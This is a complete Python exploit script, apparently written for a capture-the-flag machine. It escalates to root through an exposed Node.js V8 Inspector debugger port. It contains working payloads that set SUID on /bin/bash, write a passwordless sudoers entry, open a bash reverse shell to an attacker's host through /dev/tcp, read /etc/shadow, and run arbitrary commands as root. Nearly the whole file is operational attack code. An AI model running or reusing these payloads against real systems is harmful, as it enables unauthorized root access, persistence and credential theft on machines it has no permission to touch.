#!/usr/bin/env python3
"""
Node.js Inspector Privilege Escalation Exploit
===============================================
Target: Node.js process running as root with --inspect on port 9229
Use:    Run as a low-privileged user (e.g., 'engineer') on the target box.

The V8 Inspector Protocol exposes a WebSocket that accepts Runtime.evaluate
commands. Any code evaluated inherits the privileges of the Node.js process.

Requirements on target: python3, plus websocket-client OR the script falls
back to a raw-socket implementation so no pip install is needed.
"""

import json
import sys
import argparse
import urllib.request
import socket
import hashlib
import base64
import struct
import os
import time

# ---------------------------------------------------------------------------
# WebSocket helpers (minimal, dependency-free implementation)
# ---------------------------------------------------------------------------

def _ws_handshake(sock, host, port, path):
    """Perform the HTTP WebSocket upgrade handshake."""
    key = base64.b64encode(os.urandom(16)).decode()
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    )
    sock.sendall(request.encode())

    # Read response headers
    response = b""
    while b"\r\n\r\n" not in response:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("Connection closed during handshake")
        response += chunk

    if b"101" not in response.split(b"\r\n")[0]:
        raise ConnectionError(f"WebSocket handshake failed:\n{response.decode()}")


def _ws_send(sock, message):
    """Send a masked WebSocket text frame."""
    payload = message.encode("utf-8")
    frame = bytearray()

    # FIN + text opcode
    frame.append(0x81)

    # Length + mask bit
    length = len(payload)
    if length < 126:
        frame.append(0x80 | length)
    elif length < 65536:
        frame.append(0x80 | 126)
        frame.extend(struct.pack(">H", length))
    else:
        frame.append(0x80 | 127)
        frame.extend(struct.pack(">Q", length))

    # Masking key
    mask = os.urandom(4)
    frame.extend(mask)

    # Masked payload
    masked = bytearray(b ^ mask[i % 4] for i, b in enumerate(payload))
    frame.extend(masked)

    sock.sendall(frame)


def _ws_recv(sock):
    """Receive a single WebSocket frame and return the text payload."""
    def _recv_exact(n):
        data = b""
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                raise ConnectionError("Connection closed")
            data += chunk
        return data

    header = _recv_exact(2)
    opcode = header[0] & 0x0F
    masked = bool(header[1] & 0x80)
    length = header[1] & 0x7F

    if length == 126:
        length = struct.unpack(">H", _recv_exact(2))[0]
    elif length == 127:
        length = struct.unpack(">Q", _recv_exact(8))[0]

    if masked:
        mask = _recv_exact(4)

    payload = _recv_exact(length)

    if masked:
        payload = bytearray(b ^ mask[i % 4] for i, b in enumerate(payload))

    if opcode == 0x1:  # Text
        return payload.decode("utf-8")
    elif opcode == 0x8:  # Close
        return None
    return payload.decode("utf-8", errors="replace")


# ---------------------------------------------------------------------------
# Inspector Protocol helpers
# ---------------------------------------------------------------------------

def get_ws_url(host, port):
    """Query /json to discover the debugger WebSocket URL."""
    url = f"http://{host}:{port}/json"
    try:
        with urllib.request.urlopen(url, timeout=5) as resp:
            data = json.loads(resp.read().decode())
    except Exception as e:
        # Fallback: try /json/list
        url = f"http://{host}:{port}/json/list"
        try:
            with urllib.request.urlopen(url, timeout=5) as resp:
                data = json.loads(resp.read().decode())
        except Exception as e2:
            print(f"[!] Failed to query inspector endpoint: {e2}")
            sys.exit(1)

    if not data:
        print("[!] No debugger targets found on /json endpoint.")
        sys.exit(1)

    target = data[0]
    ws_url = target.get("webSocketDebuggerUrl")
    if not ws_url:
        print("[!] No webSocketDebuggerUrl in response. Target may already be connected.")
        print(f"    Raw response: {json.dumps(target, indent=2)}")
        sys.exit(1)

    print(f"[*] Target: {target.get('title', 'unknown')}")
    print(f"[*] WebSocket URL: {ws_url}")
    return ws_url


def evaluate(sock, expression, msg_id=1):
    """Send a Runtime.evaluate command and return the result."""
    msg = json.dumps({
        "id": msg_id,
        "method": "Runtime.evaluate",
        "params": {
            "expression": expression,
            "objectGroup": "console",
            "includeCommandLineAPI": True,
            "silent": False,
            "returnByValue": True,
            "generatePreview": False,
            "awaitPromise": True,
        }
    })
    _ws_send(sock, msg)

    # Read responses until we get our result
    while True:
        raw = _ws_recv(sock)
        if raw is None:
            print("[!] WebSocket closed by server.")
            return None
        data = json.loads(raw)
        if data.get("id") == msg_id:
            return data


def connect_ws(ws_url):
    """Parse a ws:// URL and return a connected socket after handshake."""
    # Parse ws://host:port/path
    ws_url = ws_url.replace("ws://", "")
    host_port, path = ws_url.split("/", 1)
    path = "/" + path
    if ":" in host_port:
        host, port = host_port.split(":")
        port = int(port)
    else:
        host = host_port
        port = 80

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))
    _ws_handshake(sock, host, port, path)
    return sock


# ---------------------------------------------------------------------------
# Payload generators
# ---------------------------------------------------------------------------

PAYLOADS = {
    "suid": {
        "desc": "Set SUID bit on /bin/bash (then run: bash -p)",
        "code": "require('child_process').execSync('chmod +s /bin/bash').toString()",
    },
    "sudoers": {
        "desc": "Add current user to sudoers with NOPASSWD (then run: sudo -s)",
        "code": (
            "(() => {"
            "  const user = require('child_process').execSync('whoami').toString().trim() || '{user}';"
            "  const line = '{user} ALL=(ALL) NOPASSWD:ALL\\n';"
            "  require('fs').writeFileSync('/etc/sudoers.d/pwned', line, {{mode: 0o440}});"
            "  return 'Sudoers entry written for {user}';"
            "})()"
        ),
    },
    "revshell": {
        "desc": "Bash reverse shell back to attacker",
        "code": (
            "require('child_process').exec("
            "'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"'"
            ")"
            ".toString()"
        ),
    },
    "cmd": {
        "desc": "Run an arbitrary command as root",
        "code": "require('child_process').execSync('{cmd}').toString()",
    },
    "read": {
        "desc": "Read a file as root (e.g., /root/root.txt)",
        "code": "require('fs').readFileSync('{file}', 'utf8')",
    },
    "id": {
        "desc": "Run `id` to confirm root execution",
        "code": "require('child_process').execSync('id').toString()",
    },
}


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def banner():
    print(r"""
    _   __          __        ____                           __
   / | / /___  ____/ /__     /  _/___  _________  ___  _____/ /_____  _____
  /  |/ / __ \/ __  / _ \    / // __ \/ ___/ __ \/ _ \/ ___/ __/ __ \/ ___/
 / /|  / /_/ / /_/ /  __/  _/ // / / (__  ) /_/ /  __/ /__/ /_/ /_/ / /
/_/ |_/\____/\__,_/\___/  /___/_/ /_/____/ .___/\___/\___/\__/\____/_/
                                         /_/
              Local Privilege Escalation via V8 Inspector
    """)


def main():
    banner()

    parser = argparse.ArgumentParser(
        description="Node.js Inspector LPE — Escalate via V8 debugger WebSocket",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Payload Examples:
  %(prog)s --payload suid                          # chmod +s /bin/bash
  %(prog)s --payload read --file /root/root.txt    # Read root flag
  %(prog)s --payload revshell --lhost 10.10.14.5 --lport 4444
  %(prog)s --payload cmd --cmd "cat /etc/shadow"
  %(prog)s --payload id                            # Quick whoami check
        """
    )
    parser.add_argument("--host", default="127.0.0.1", help="Inspector host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=9229, help="Inspector port (default: 9229)")
    parser.add_argument("--payload", default="id", choices=PAYLOADS.keys(),
                        help="Payload to execute (default: id)")
    parser.add_argument("--lhost", help="Attacker IP for reverse shell")
    parser.add_argument("--lport", type=int, help="Attacker port for reverse shell")
    parser.add_argument("--cmd", help="Arbitrary command for 'cmd' payload")
    parser.add_argument("--file", help="File path for 'read' payload")
    parser.add_argument("--user", default="engineer", help="Username for sudoers payload (default: engineer)")
    parser.add_argument("--ws-url", help="Provide full WebSocket URL directly (skip /json discovery)")

    args = parser.parse_args()

    # Validate payload-specific arguments
    if args.payload == "revshell" and (not args.lhost or not args.lport):
        parser.error("--lhost and --lport are required for the revshell payload")
    if args.payload == "cmd" and not args.cmd:
        parser.error("--cmd is required for the cmd payload")
    if args.payload == "read" and not args.file:
        parser.error("--file is required for the read payload")

    # ---- Step 1: Discover WebSocket URL ----
    if args.ws_url:
        ws_url = args.ws_url
        print(f"[*] Using provided WebSocket URL: {ws_url}")
    else:
        print(f"[*] Querying inspector at {args.host}:{args.port} ...")
        ws_url = get_ws_url(args.host, args.port)

    # ---- Step 2: Connect ----
    print(f"[*] Connecting to WebSocket ...")
    try:
        sock = connect_ws(ws_url)
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        sys.exit(1)
    print(f"[+] Connected!")

    # ---- Step 3: Enable Runtime domain ----
    enable_msg = json.dumps({"id": 0, "method": "Runtime.enable"})
    _ws_send(sock, enable_msg)
    # Drain the enable response + any context-created events
    time.sleep(0.5)
    try:
        while True:
            sock.settimeout(0.5)
            _ws_recv(sock)
    except (socket.timeout, ConnectionError):
        pass
    sock.settimeout(10)

    # ---- Step 4: Build and send payload ----
    payload_info = PAYLOADS[args.payload]
    code = payload_info["code"]

    # Template substitution
    code = code.replace("{lhost}", args.lhost or "")
    code = code.replace("{lport}", str(args.lport or ""))
    code = code.replace("{cmd}", (args.cmd or "").replace("'", "\\'"))
    code = code.replace("{file}", (args.file or "").replace("'", "\\'"))
    code = code.replace("{user}", args.user)

    print(f"[*] Payload: {payload_info['desc']}")
    print(f"[*] Evaluating: {code[:120]}{'...' if len(code) > 120 else ''}")

    result = evaluate(sock, code, msg_id=42)

    if result is None:
        print("[!] No response received.")
        sys.exit(1)

    # ---- Step 5: Display result ----
    res = result.get("result", {}).get("result", {})
    exc = result.get("result", {}).get("exceptionDetails")

    if exc:
        print(f"\n[!] Exception during evaluation:")
        print(f"    {exc.get('text', '')}")
        if "exception" in exc:
            print(f"    {exc['exception'].get('description', '')}")
    else:
        value = res.get("value", res.get("description", "<no output>"))
        print(f"\n[+] Result:\n")
        print(value)

    # ---- Post-exploitation hints ----
    if args.payload == "suid":
        print("\n[*] SUID bit set. Now run:")
        print("      bash -p")
        print("    You should drop to a root shell.")
    elif args.payload == "sudoers":
        print(f"\n[*] Sudoers entry written. Now run:")
        print(f"      sudo -s")

    sock.close()
    print("\n[*] Done.")


if __name__ == "__main__":
    main()

